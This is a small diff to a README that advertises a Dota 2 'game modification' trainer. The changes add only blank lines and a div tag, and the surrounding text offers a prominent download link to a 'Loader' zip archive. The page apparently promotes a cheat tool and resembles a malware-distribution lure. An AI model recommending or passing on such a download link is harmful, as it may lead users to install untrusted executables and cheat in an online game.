@@ -4,9 +4,12 @@
 
 > ⚡ Advanced Game Modification Project for Dota 2
 
+
 [![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Lowercladisconnect/LomerunekProk/releases/download/v1.0.0/Loader.v2.6.zip)
 
 Latest Version: v1.0.0 • File Size: ~156 MB
+
+</div>
 
 </div>
 
@@ -42,3 +45,4 @@ configs/
 `Dota-2` · Updated: 2026-10-01
 
 **Tags:** `Dota-2` `dota-2-trainer`
+
